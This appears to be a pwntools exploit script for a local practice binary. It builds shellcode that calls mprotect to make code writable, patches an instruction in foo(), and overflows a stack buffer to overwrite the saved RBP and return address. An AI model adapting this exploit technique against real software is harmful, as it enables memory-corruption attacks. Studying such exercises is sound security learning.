#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *

EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/vuln'

FOO_ADDRESS = 0x401186
MAIN_RETURN_ADDRESS = 0x4012ea
PAGE_SIZE = 4096

OFFSET_FROM_BUFFER_TO_RBP = 64
ORIGINAL_RBP = 0x7fffffffece0
BUFFER_ADDR = 0x7fffffffec70

context.binary = EXE_PATH

#   4011c9:	ba 07 00 00 00       	mov    $0x7,%edx
#   4011ce:	be 00 10 00 00       	mov    $0x1000,%esi
#   4011d3:	bf 00 10 40 00       	mov    $0x401000,%edi
#   4011d8:	e8 b3 fe ff ff       	call   401090 <mprotect@plt>



foo_page_address = FOO_ADDRESS - (FOO_ADDRESS % PAGE_SIZE)

# PROT_READ | PROT_WRITE | PROT_EXEC = 7

print(pwnlib.shellcraft.amd64.linux.syscall('SYS_mprotect', foo_page_address, PAGE_SIZE, 'PROT_READ | PROT_WRITE | PROT_EXEC').rstrip())

#  78 00c2 C745E8E6              movl    $255570150, -24(%rbp)
#   78      B03B0F
#   79 00c9 66C745EC              movw    $5, -20(%rbp)
#   40:minimal_example/mutate.c ****     // Change the immediate value in the addl instruction in foo() to 42
#   41:minimal_example/mutate.c ****     unsigned char *instruction = (unsigned char*)foo_addr + 18;
#   80                            .loc 1 41 20
#   81 00cf 488B45C0              movq    -64(%rbp), %rax
#   82 00d3 4883C012              addq    $18, %rax
#   83 00d7 488945C8              movq    %rax, -56(%rbp)
#   42:minimal_example/mutate.c ****     *instruction = 0x2A;
#   84                            .loc 1 42 18
#   85 00db 488B45C8              movq    -56(%rbp), %rax
#   86 00df C6002A                movb    $42, (%rax)

# print(asm(f'''
#     mov rax, 0x{foo_address+18:X}
#     mov byte ptr [rdi], 42
#     call 0x{foo_address:X}
# ''', vma=0x7ffff7fd5f5b))

sh = asm(
    pwnlib.shellcraft.amd64.linux.syscall('SYS_mprotect', foo_page_address, PAGE_SIZE, 'PROT_READ | PROT_WRITE | PROT_EXEC') +
    f'''
    mov    eax,0x{FOO_ADDRESS+18:X}
    mov    BYTE PTR [rax],0x2a
    push 0x{MAIN_RETURN_ADDRESS:X}
    ret
''')

filler_len = OFFSET_FROM_BUFFER_TO_RBP - len(sh)
print(f"filler_len: {filler_len}")

payload = sh
payload += asm('nop') * filler_len
payload += p64(ORIGINAL_RBP)
payload += p64(BUFFER_ADDR)

with open('./bin/input3', 'wb') as fd:
    fd.write(payload)

